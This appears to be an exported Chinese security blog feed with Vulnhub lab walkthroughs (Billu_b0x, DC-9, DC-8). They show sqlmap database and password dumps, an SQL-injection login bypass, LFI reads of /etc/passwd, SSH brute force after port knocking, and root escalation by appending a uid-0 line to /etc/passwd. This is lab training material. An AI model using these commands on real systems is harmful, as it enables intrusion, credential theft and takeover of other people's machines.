<p>有些也可以使用<strong>内联注释</strong>+<strong>fuzz</strong>+<strong>换行符</strong>进行绕过</p>
]]></content>
      <categories>
        <category>bypass</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs1</title>
    <url>/posts/685229a3/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Billu_b0x</title>
    <url>/posts/827ecdf7/</url>
    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
<p>网段        192.168.18.0/24</p>
<p>kali        192.168.18.131</p>
<p>靶机        192.168.18.144</p>
</blockquote>
<h4 id="nmap扫网段"><a href="#nmap扫网段" class="headerlink" title="nmap扫网段"></a>nmap扫网段</h4><p><code>sudo nmap 192.168.18.0/24 -sP</code></p>
<blockquote>
<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-11 19:58 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.000079s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.144<br>Host is up (0.00054s latency).<br>MAC Address: 00:0C:29:77:56:7F (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00017s latency).<br>MAC Address: 00:50:56:FD:0E:3D (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.25 seconds</p>
</blockquote>
<h4 id="nmap扫端口"><a href="#nmap扫端口" class="headerlink" title="nmap扫端口"></a>nmap扫端口</h4><p><code>sudo nmap 192.168.18.144 -p- -sV</code></p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.144 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-11 20:00 CST<br>Nmap scan report for 192.168.18.144<br>Host is up (0.0012s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)<br>80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))<br>MAC Address: 00:0C:29:77:56:7F (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 7.91 seconds</p>
</blockquote>
<p>开放了22端口和80端口</p>
<h4 id="dirsearch扫描目录"><a href="#dirsearch扫描目录" class="headerlink" title="dirsearch扫描目录"></a>dirsearch扫描目录</h4><p><code>sudo python3 dirsearch.py -u 192.168.18.144</code></p>
<blockquote>
<p>[20:25:23] 200 -  307B  - /add<br>[20:25:23] 200 -  307B  - /add.php<br>[20:25:25] 200 -    1B  - /c<br>[20:25:25] 403 -  290B  - /cgi-bin/<br>[20:25:27] 403 -  286B  - /doc/<br>[20:25:27] 403 -  301B  - /doc/en/changes.html<br>[20:25:27] 403 -  290B  - /doc/api/<br>[20:25:27] 403 -  300B  - /doc/stable.version<br>[20:25:27] 200 -    3KB - /head.php<br>[20:25:28] 200 -    1KB - /images/<br>[20:25:28] 301 -  317B  - /images  -&gt;  <a href="http://192.168.18.144/images/">http://192.168.18.144/images/</a><br>[20:25:28] 200 -   47KB - /in<br>[20:25:28] 200 -    3KB - /index<br>[20:25:28] 200 -    3KB - /index.php </p>
<p>[20:25:29] 302 -    2KB - /panel  -&gt;  index.php<br>[20:25:29] 302 -    2KB - /panel.php  -&gt;  index.php<br>[20:25:30] 200 -    8KB - /phpmy/<br>[20:25:31] 403 -  296B  - /server-status/<br>[20:25:31] 403 -  295B  - /server-status<br>[20:25:31] 200 -    1B  - /show<br>[20:25:32] 200 -   72B  - /test<br>[20:25:32] 200 -   72B  - /test.php    </p>
</blockquote>
<p>扫出</p>
<p><code>add.php</code>     文件上传</p>
<p><img src="/posts/827ecdf7/add.png"></p>
<p><code>head.php</code> 貌似没啥东西 就一背景图</p>
<p><img src="/posts/827ecdf7/head.png"></p>
<p><code>test.php</code> 文件包含</p>
<p><img src="/posts/827ecdf7/test.png"></p>
<p><code>phpmy</code>        phpmyadmin登录页面</p>
<p><img src="/posts/827ecdf7/phpmy.png"></p>
<p><code>in</code>            phpinfo()</p>
<p><img src="/posts/827ecdf7/phpinfo.png"></p>
<blockquote>
<p>allow_url_fopen    On<br>allow_url_include    Off<br>mysql版本为5.5.38</p>
</blockquote>
<h4 id="用dirb扫描目录"><a href="#用dirb扫描目录" class="headerlink" title="用dirb扫描目录"></a>用dirb扫描目录</h4><blockquote>
<p> —- Scanning URL: <a href="http://192.168.18.144/">http://192.168.18.144/</a> —-</p>
<ul>
<li><a href="http://192.168.18.144/add">http://192.168.18.144/add</a> (CODE:200|SIZE:307)                                                          </li>
<li><a href="http://192.168.18.144/c">http://192.168.18.144/c</a> (CODE:200|SIZE:1)                                                              </li>
<li><a href="http://192.168.18.144/cgi-bin/">http://192.168.18.144/cgi-bin/</a> (CODE:403|SIZE:290)                                                     </li>
<li><a href="http://192.168.18.144/head">http://192.168.18.144/head</a> (CODE:200|SIZE:2793)<br>==&gt; DIRECTORY: <a href="http://192.168.18.144/images/">http://192.168.18.144/images/</a>                                                             </li>
<li><a href="http://192.168.18.144/in">http://192.168.18.144/in</a> (CODE:200|SIZE:47554)                                                         </li>
<li><a href="http://192.168.18.144/index">http://192.168.18.144/index</a> (CODE:200|SIZE:3267)                                                       </li>
<li><a href="http://192.168.18.144/index.php">http://192.168.18.144/index.php</a> (CODE:200|SIZE:3267)                                                   </li>
<li><a href="http://192.168.18.144/panel">http://192.168.18.144/panel</a> (CODE:302|SIZE:2469)                                                       </li>
<li><a href="http://192.168.18.144/server-status">http://192.168.18.144/server-status</a> (CODE:403|SIZE:295)                                                </li>
<li><a href="http://192.168.18.144/show">http://192.168.18.144/show</a> (CODE:200|SIZE:1)                                                           </li>
<li><a href="http://192.168.18.144/test">http://192.168.18.144/test</a> (CODE:200|SIZE:72)                                                          </li>
</ul>
</blockquote>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>进入主页，有一个登录框，并提示sql注入</p>
<p><img src="/posts/827ecdf7/index.png"></p>
<p>尝试下sql注入，用sqlmap跑一下</p>
<p><code>sqlmap -u &#39;http://192.168.18.144/&#39;  --method POST --data &#39;un=admin&amp;os=admin&amp;login=let%27s+login&#39; --batch --dbms mysql </code></p>
<p>没扫出来注入点</p>
<br>

<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>传一个图片马试试，或许后面会用到</p>
<br>

<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>在<code>test.php</code>get请求 传参 <code>?file=/etc/passwd</code>没反应</p>
<p>使用post传参<code>file=/etc/passwd</code>会弹出一个下载文件窗口</p>
<p>文件内容为<code>/etc/passwd</code>的输出内容</p>
<p>使用burp抓包，把get包改为post包</p>
<p><img src="/posts/827ecdf7/file_include1.png"></p>
<blockquote>
<p>ica:x:1000:1000:ica,,,:/home/ica:/bin/bash</p>
</blockquote>
<p>发现一个<code>ica</code>的用户，可以登录ssh</p>
<br>


<p>同时用这种方法去下载<code>add.php</code>,<code>in.php</code> <code>index.php</code> <code>test.php</code> <code>show.php</code> <code>c.php</code></p>
<p><img src="/posts/827ecdf7/addphp.png"><br>在add.php中有文件上传的代码，没有经过任何处理，可以考虑去上传图片马在in.php中是phpinfo信息</p>
<h4 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h4><h5 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h5><p><img src="/posts/827ecdf7/cphp.png"><br>在c.php中发现了mysql数据库的账户信息<code>$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);</code></p>
<blockquote>
<p>用户名 billu密码 b0x_billu数据库名 ica_lab</p>
</blockquote>
<p>使用这个账户去尝试登录phpmyadmin，成功登录,并得到phpmyadmin版本为3.4.7登录后台思路一 使用phpmyadmin中账号<br><img src="/posts/827ecdf7/auth.png"><br>在anth表中得到一个账户 biLLu hEx_it使用此账户成功登录到后台</p>
<h5 id="思路二-SQL注入再尝试查看index-php的源码"><a href="#思路二-SQL注入再尝试查看index-php的源码" class="headerlink" title="思路二 SQL注入再尝试查看index.php的源码"></a>思路二 SQL注入再尝试查看index.php的源码</h5><p><img src="/posts/827ecdf7/sqli.png"><br><code>select * from auth where pass=\&#39;&#39;.$pass=.&#39;\&#39; and uname=\&#39;&#39;.$uname.&#39;\&#39;</code><br>前面使用str_replace 将单引号全部过滤掉了，<br><code>select   from auth where pass=&#39; &#39; and uname=&#39; &#39;</code><br>输入<code>pass=admin\   uname= or 1=1 --+</code><br>即 <code>select  from auth where pass=&#39;admin\&#39; and uname=&#39; or 1=1 --+&#39;</code><br>成功登录文件上传<br><img src="/posts/827ecdf7/login.png"><br>审计一下panel.php<br>页面有两个功能 show users 和 add users 对于文件上传使用了白名单机制，只允许上传<code>jpeg,jpg,gif,png</code><br>当要上传一张图片是，会先判断后缀名是否正确，如果正确，还有一个mime验证<br><code>move_uploaded_file($_FILES[&#39;image&#39;][&#39;tmp_name&#39;], &#39;uploaded_images/&#39;.$_FILES[&#39;image&#39;][&#39;name&#39;])</code>可以看到上传图片的路径为uploaded_images/</p>
<p>这里传马多次都没传成功，有时间再试试吧….</p>
<h4 id="得到root权限思路二"><a href="#得到root权限思路二" class="headerlink" title="得到root权限思路二"></a>得到root权限思路二</h4><p>phpmyadmin的配置文件为<code>config.inc.php</code> 使用任意文件下载去下载改配置文件<br><img src="/posts/827ecdf7/download_phpmyconf.png"><br><img src="/posts/827ecdf7/phpmyconf.png"><br>得到一个root账户root roottoor使用ssh登录 ssh <a href="mailto:&#x72;&#111;&#111;&#116;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#x2e;&#49;&#56;&#46;&#x31;&#52;&#52;">&#x72;&#111;&#111;&#116;&#x40;&#x31;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#x2e;&#49;&#56;&#46;&#x31;&#52;&#52;</a>成功登录root用户</p>
<p>Reference</p>
<blockquote>
<p><a href="https://blog.csdn.net/weixin_52049485/article/details/112248860">https://blog.csdn.net/weixin_52049485/article/details/112248860</a><br><a href="https://www.cnblogs.com/PANDA-Mosen/p/13217674.html">https://www.cnblogs.com/PANDA-Mosen/p/13217674.html</a><br><a href="https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/">https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>vulhub</category>
      </categories>
      <tags>
        <tag>vulhub</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges9</title>
    <url>/posts/73305909/</url>
    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
<p>网段     192.168.18.0/24</p>
<p>kali    192.168.18.131</p>
<p>靶机    192.168.18.142</p>
</blockquote>
<h4 id="扫描网段"><a href="#扫描网段" class="headerlink" title="扫描网段"></a>扫描网段</h4><blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-10 20:27 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00039s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.142<br>Host is up (0.00043s latency).<br>MAC Address: 00:0C:29:C2:75:62 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00018s latency).<br>MAC Address: 00:50:56:FD:0E:3D (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.12 seconds</p>
</blockquote>
<h4 id="扫描靶机端口"><a href="#扫描靶机端口" class="headerlink" title="扫描靶机端口"></a>扫描靶机端口</h4><blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.142 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-10 20:35 CST<br>Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan<br>NSE Timing: About 93.02% done; ETC: 20:36 (0:00:00 remaining)<br>Nmap scan report for 192.168.18.142<br>Host is up (0.0014s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE    SERVICE VERSION<br>22/tcp filtered ssh<br>80/tcp open     http    Apache httpd 2.4.38 ((Debian))<br>MAC Address: 00:0C:29:C2:75:62 (VMware)</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 8.70 seconds<br>kali@kali2020:~$ </p>
</blockquote>
<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>发现一个搜索框和登录框，看下是否存在sql注入</p>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot; --dbs --batch</code></p>
<p>得到三个数据库</p>
<blockquote>
<p>available databases [3]:<br>[*] information_schema<br>[*] Staff<br>[*] users</p>
</blockquote>
<p><code> sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D users --tables</code></p>
<blockquote>
<p>Database: users<br>[1 table]<br>+————-+<br>| UserDetails |<br>+————-+</p>
</blockquote>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D users -T UserDetails --columns</code></p>
<blockquote>
<p>Database: users<br>Table: UserDetails<br>[6 columns]<br>+———–+—————–+<br>| Column    | Type            |<br>+———–+—————–+<br>| firstname | varchar(30)     |<br>| id        | int(6) unsigned |<br>| lastname  | varchar(30)     |<br>| password  | varchar(20)     |<br>| reg_date  | timestamp       |<br>| username  | varchar(30)     |<br>+———–+—————–+</p>
</blockquote>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D users -T UserDetails -C username,password --dump</code>结果发现这是display页面的信息换另一个表跑一下</p>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D Staff --tables</code></p>
<blockquote>
<p>Database: Staff<br>[2 tables]<br>+————–+<br>| StaffDetails |<br>| Users        |<br>+————–+</p>
</blockquote>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D Staff -T Users --column</code></p>
<blockquote>
<p>Database: Staff<br>Table: Users<br>[3 columns]<br>+———-+—————–+<br>| Column   | Type            |<br>+———-+—————–+<br>| Password | varchar(255)    |<br>| UserID   | int(6) unsigned |<br>| Username | varchar(255)    |</p>
</blockquote>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D Staff -T Users -C Username,Password  --dump</code></p>
<blockquote>
<p>Database: Staff<br>Table: Users<br>[1 entry]<br>+———-+———————————-+<br>| Username | Password                         |<br>+———-+———————————-+<br>| admin    | 856f5de590ef37314e7c3bdf6f8a66dc |<br>+———-+———————————-+</p>
</blockquote>
<p>跑出<code>admin</code> <code>856f5de590ef37314e7c3bdf6f8a66dc</code></p>
<p>md5解出来<code>transorbital1</code></p>
<p>跑出另一个数据库的数据</p>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D users -T UserDetails -C username,password --dump</code></p>
<blockquote>
<p>Database: users<br>Table: UserDetails<br>[17 entries]<br>+———–+—————+<br>| username  | password      |<br>+———–+—————+<br>| marym     | 3kfs86sfd     |<br>| julied    | 468sfdfsd2    |<br>| fredf     | 4sfd87sfd1    |<br>| barneyr   | RocksOff      |<br>| tomc      | TC&amp;TheBoyz    |<br>| jerrym    | B8m#48sd      |<br>| wilmaf    | Pebbles       |<br>| bettyr    | BamBam01      |<br>| chandlerb | UrAG0D!       |<br>| joeyt     | Passw0rd      |<br>| rachelg   | yN72#dsd      |<br>| rossg     | ILoveRachel   |<br>| monicag   | 3248dsds7s    |<br>| phoebeb   | smellycats    |<br>| scoots    | YR3BVxxxw87   |<br>| janitor   | Ilovepeepee   |<br>| janitor2  | Hawaii-Five-0 |<br>+———–+—————+</p>
</blockquote>
<p>去<code>manage.php</code>登录下试试,成功登录</p>
<p>页面左下角有一个<code> File does not exist</code>推测有本地文件包含漏洞</p>
<p><img src="/posts/73305909/file_include_etcpasswd.png"></p>
<p><img src="/posts/73305909/Wappalyzer.png"></p>
<p>使用的apache</p>
<p><img src="/posts/73305909/apache.png"></p>
<p>用burp 爆破了下LFI字典 没发现有用的信息</p>
<p><img src="/posts/73305909/intruder.png"></p>
<p>去试试之前跑出来的用户账号能不能ssh登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># username</span><br><span class="line">marym</span><br><span class="line">julied</span><br><span class="line">fredf</span><br><span class="line">barneyr</span><br><span class="line">tomc</span><br><span class="line">jerrym</span><br><span class="line">wilmaf</span><br><span class="line">bettyr</span><br><span class="line">chandlerb</span><br><span class="line">joeyt</span><br><span class="line">rachelg</span><br><span class="line">rossg</span><br><span class="line">monicag</span><br><span class="line">phoebeb</span><br><span class="line">scoots</span><br><span class="line">janitor</span><br><span class="line">janitor2</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#passwd</span><br><span class="line">3kfs86sfd</span><br><span class="line">468sfdfsd2</span><br><span class="line">4sfd87sfd1</span><br><span class="line">RocksOff</span><br><span class="line">TC&amp;TheBoyz</span><br><span class="line">B8m#48sd</span><br><span class="line">Pebbles</span><br><span class="line">BamBam01</span><br><span class="line">UrAG0D!</span><br><span class="line">Passw0rd</span><br><span class="line">yN72#dsd</span><br><span class="line">ILoveRachel</span><br><span class="line">3248dsds7s</span><br><span class="line">smellycats</span><br><span class="line">YR3BVxxxw87</span><br><span class="line">Ilovepeepee</span><br><span class="line">Hawaii-Five-0</span><br></pre></td></tr></table></figure>

<p><img src="/posts/73305909/ssh_connect_error.png"></p>
<p>发现全是连接失败，但是nmap扫描端口的时候22端口是开放的</p>
<p>网上搜了下，这是使用的<strong>knock服务(端口敲门服务)</strong> </p>
<h3 id="knock服务"><a href="#knock服务" class="headerlink" title="knock服务"></a>knock服务</h3><p>Knockd的配置文件路径为<code>/etc/knockd.conf</code></p>
<p><img src="/posts/73305909/knockd_conf.png"></p>
<p>开放了<code>7469</code>,<code>8475</code>,<code>9842</code>三个端口</p>
<p>在默认情况下，22端口是关闭的，只有访问了以上三个端口后，22端口才会开放。</p>
<p>使用nmap访问以上三个端口</p>
<p>访问后在去连接ssh，ssh端口可以访问</p>
<p><img src="/posts/73305909/ssh_connect.png"></p>
<p><img src="/posts/73305909/hydra1.png"></p>
<p>最后试出了三组可以ssh登录的账号</p>
<blockquote>
<p>chandlerb   UrAG0D!<br>joeyt       Passw0rd<br>janitor     Ilovepeepee</p>
</blockquote>
<p><img src="/posts/73305909/ssh1.png"></p>
<p>在<code>janitor</code>用户下发现一个隐藏文件夹，里面包含一个密码本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># passwords-found-on-post-it-notes.txt </span><br><span class="line"></span><br><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic#10-4</span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br></pre></td></tr></table></figure>

<p><img src="/posts/73305909/hydra2.png"></p>
<p>跑出了一个账号</p>
<p><code>fredf</code> <code>B4-Tru3-001</code></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img src="/posts/73305909/fredf_sudo.png"></p>
<p>不需要密码可以执行<code>/opt/devstuff/dist/test/test</code></p>
<p><img src="/posts/73305909/testpy.png"></p>
<p>提示test是个py文件</p>
<p>找一下test.py</p>
<p><code>find / -name &quot;test.py&quot; 2&gt;/dev/null</code></p>
<p><img src="/posts/73305909/find_test.png"></p>
<p>发现两个文件</p>
<blockquote>
<p>/opt/devstuff/test.py<br>/usr/lib/python3/dist-packages/setuptools/command/test.py</p>
</blockquote>
<p>估计只有第一个可以用得上</p>
<p><code>cat /opt/devstuff/test.py</code></p>
<p><img src="/posts/73305909/testpy1.png"></p>
<p>需要两个参数，把第一个参数的内容追加到第二个文件中</p>
<p>使用openssl创建一个用户</p>
<p><code> openssl  passwd -1 -salt Mamor 123456</code><br><code>$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/</code></p>
<p>构造一个用户</p>
<p><code>Mamor:$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/:0:0::/root:/bin/bash</code></p>
<p>echo “Mamor:$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/:0:0::/root:/bin/bash” &gt; /tmp/mamor</p>
<p>sudo ./test /tmp/mamor /etc/passswd</p>
<p>构造失败没法写入</p>
<p><code>cat  /tmp/mamor </code></p>
<p><img src="/posts/73305909/usercreate_error.png"></p>
<p>发现写入的数据并不是原数据</p>
<p>换<code>&#39;</code>试试</p>
<p><code>echo &#39;Mamor:$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/:0:0::/root:/bin/bash&#39; &gt; /tmp/mamor1</code></p>
<p><img src="/posts/73305909/usercreate.png"></p>
<p>还是没法写入</p>
<p><code>openssl passwd -1 -salt test test</code></p>
<blockquote>
<p>$1$test$pi/xDtU5WFVRqYS6BMU8X/</p>
</blockquote>
<p><code>echo &#39;test:$1$test$pi/xDtU5WFVRqYS6BMU8X/:0:0::/root:/bin/bash&#39; &gt;&gt; /tmp/testtest</code></p>
<p><code>sudo ./test /tmp/testtest /etc/passwd</code></p>
<p><code>cat /etc/passwd</code></p>
<blockquote>
<p>test:$1$test$pi/xDtU5WFVRqYS6BMU8X/:0:0::/root:/bin/bash</p>
</blockquote>
<p>这次写入成功</p>
<p><img src="/posts/73305909/flag.png"></p>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges8</title>
    <url>/posts/437699f/</url>
    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
<p>网段     192.168.18.0/24</p>
<p>kali        192.168.18.131</p>
<p>靶机        192.168.18.141</p>
</blockquote>
<h4 id="扫描网段"><a href="#扫描网段" class="headerlink" title="扫描网段"></a>扫描网段</h4><blockquote>
<p> kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn<br>[sudo] kali 的密码：<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-08 21:27 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00035s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.141<br>Host is up (0.00063s latency).<br>MAC Address: 00:0C:29:F3:39:D5 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00032s latency).<br>MAC Address: 00:50:56:FD:0E:3D (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 3.53 seconds</p>
</blockquote>
<h4 id="扫描靶机"><a href="#扫描靶机" class="headerlink" title="扫描靶机"></a>扫描靶机</h4><blockquote>
<p> kali@kali2020:~$ sudo nmap 192.168.18.141 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-08 21:30 CST<br>Nmap scan report for 192.168.18.141<br>Host is up (0.0015s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)<br>80/tcp open  http    Apache httpd<br>MAC Address: 00:0C:29:F3:39:D5 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 18.93 seconds</p>
</blockquote>
<h4 id="dirsearch扫目录"><a href="#dirsearch扫目录" class="headerlink" title="dirsearch扫目录"></a>dirsearch扫目录</h4><blockquote>
<p>sudo python3 dirsearch -u 192.168.18.141</p>
</blockquote>
<p>没扫到什么东西，换dirb扫到了</p>
<p><code>http://192.168.18.141/user</code></p>
<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>进入主页,点左侧的Details下的链接，发现url处有个nid的参数，看看这里是否存在sql注入</p>
<p>sqlmap跑一下</p>
<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch</code></p>
<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch --dbs</code></p>
<blockquote>
<p>available databases [2]:<br>[*] d7db<br>[*] information_schema</p>
</blockquote>
<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db --tables</code></p>
<blockquote>
<p> Database: d7db<br>[88 tables]<br>+—————————–+<br>| filter                      |<br>| system                      |<br>| actions                     |<br>| authmap                     |<br>| batch                       |<br>| block                       |<br>| block_custom                |<br>| block_node_type             |<br>| block_role                  |<br>| blocked_ips                 |<br>| cache                       |<br>| cache_block                 |<br>| cache_bootstrap             |<br>| cache_field                 |<br>| cache_filter                |<br>| cache_form                  |<br>| cache_image                 |<br>| cache_menu                  |<br>| cache_page                  |<br>| cache_path                  |<br>| cache_views                 |<br>| cache_views_data            |<br>| ckeditor_input_format       |<br>| ckeditor_settings           |<br>| ctools_css_cache            |<br>| ctools_object_cache         |<br>| date_format_locale          |<br>| date_format_type            |<br>| date_formats                |<br>| field_config                |<br>| field_config_instance       |<br>| field_data_body             |<br>| field_data_field_image      |<br>| field_data_field_tags       |<br>| field_revision_body         |<br>| field_revision_field_image  |<br>| field_revision_field_tags   |<br>| file_managed                |<br>| file_usage                  |<br>| filter_format               |<br>| flood                       |<br>| history                     |<br>| image_effects               |<br>| image_styles                |<br>| menu_custom                 |<br>| menu_links                  |<br>| menu_router                 |<br>| node                        |<br>| node_access                 |<br>| node_revision               |<br>| node_type                   |<br>| queue                       |<br>| rdf_mapping                 |<br>| registry                    |<br>| registry_file               |<br>| role                        |<br>| role_permission             |<br>| search_dataset              |<br>| search_index                |<br>| search_node_links           |<br>| search_total                |<br>| semaphore                   |<br>| sequences                   |<br>| sessions                    |<br>| shortcut_set                |<br>| shortcut_set_users          |<br>| site_messages_table         |<br>| taxonomy_index              |<br>| taxonomy_term_data          |<br>| taxonomy_term_hierarchy     |<br>| taxonomy_vocabulary         |<br>| url_alias                   |<br>| users                       |<br>| users_roles                 |<br>| variable                    |<br>| views_display               |<br>| views_view                  |<br>| watchdog                    |<br>| webform                     |<br>| webform_component           |<br>| webform_conditional         |<br>| webform_conditional_actions |<br>| webform_conditional_rules   |<br>| webform_emails              |<br>| webform_last_download       |<br>| webform_roles               |<br>| webform_submissions         |<br>| webform_submitted_data      |<br>+—————————–+</p>
</blockquote>
<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db -T users --columns</code></p>
<blockquote>
<p> Database: d7db<br>Table: users<br>[16 columns]<br>+——————+——————+<br>| Column           | Type             |<br>+——————+——————+<br>| language         | varchar(12)      |<br>| access           | int(11)          |<br>| created          | int(11)          |<br>| data             | longblob         |<br>| init             | varchar(254)     |<br>| login            | int(11)          |<br>| mail             | varchar(254)     |<br>| name             | varchar(60)      |<br>| pass             | varchar(128)     |<br>| picture          | int(11)          |<br>| signature        | varchar(255)     |<br>| signature_format | varchar(255)     |<br>| status           | tinyint(4)       |<br>| theme            | varchar(255)     |<br>| timezone         | varchar(32)      |<br>| uid              | int(10) unsigned |</p>
</blockquote>
<br>

<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db -T users -C name,pass -dump</code></p>
<blockquote>
<p>Database: d7db<br>Table: users<br>[2 entries]<br>+——-+———————————————————+<br>| name  | pass                                                    |<br>+——-+———————————————————+<br>| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |<br>| john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |<br>+——-+———————————————————+</p>
</blockquote>
<p>跑出来两条数据 ，但是密码是加密的，根据john用户名提示，使用<code>john</code>解密</p>
<br>

<p><code>admin</code> 使用john没跑出来</p>
<p><code>john</code> 密码为<code>turtle</code></p>
<p><code>http://192.168.18.141/user/</code>登录成功</p>
<p>打开content看看</p>
<p><img src="/posts/437699f/content.png"></p>
<br>

<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>contact us页面可以编辑</p>
<p>修改成php格式</p>
<p><img src="/posts/437699f/ncshell.png"></p>
<p><img src="/posts/437699f/submit.png"></p>
<p>反弹交互shell</p>
<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
